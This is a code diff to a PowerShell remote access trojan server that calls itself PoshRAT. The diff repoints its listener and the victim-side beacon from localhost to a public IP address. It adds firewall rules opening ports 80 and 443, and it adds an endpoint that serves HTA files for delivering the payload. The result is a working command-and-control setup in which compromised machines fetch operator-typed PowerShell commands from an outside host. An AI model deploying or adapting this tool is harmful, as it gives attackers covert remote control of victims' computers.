@@ -118,7 +118,7 @@ if ($CACertificate -eq $null)
 	Invoke-CreateCertificate "__PoshRAT_Trusted_Root" $true
 }
 
-$ListenerIP = "127.0.0.1"
+$ListenerIP = "166.78.254.10"  #If you Change This... Change Line 184
 $isSSL = $true
 
 $listener = New-Object System.Net.HttpListener
@@ -135,7 +135,8 @@ iex $installCert
 $listener.Prefixes.Add('https://+:443/') #HTTPS Listener
 $listener.Prefixes.Add('http://+:80/') #HTTP Initial Connect
 
-
+netsh advfirewall firewall add rule name="PoshRat 443" dir=in action=allow protocol=TCP localport=443 | Out-Null
+netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
 
 $listener.Start()
 'Listening ...'
@@ -148,7 +149,7 @@ while ($true) {
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
         
         $message = '
-					$s = "https://127.0.0.1/rat" 
+					$s = "https://166.78.254.10/rat"
 					$w = New-Object Net.WebClient 
 					while($true)
 					{
@@ -170,7 +171,17 @@ while ($true) {
     if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
         $response.ContentType = 'text/plain'
         $message = Read-Host "PS $hostip>"		
-    }		
+    }
+    if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
+		
+		$response.ContentType = 'application/hta'
+		[byte[]] $buffer = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($context.Request).RawUrl)))
+		$response.ContentLength64 = $buffer.length
+		$output = $response.OutputStream
+		$output.Write($buffer, 0, $buffer.length)
+		$output.Close()
+		continue
+	}
     
 
     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
@@ -181,4 +192,3 @@ while ($true) {
 }
 
 $listener.Stop()
-
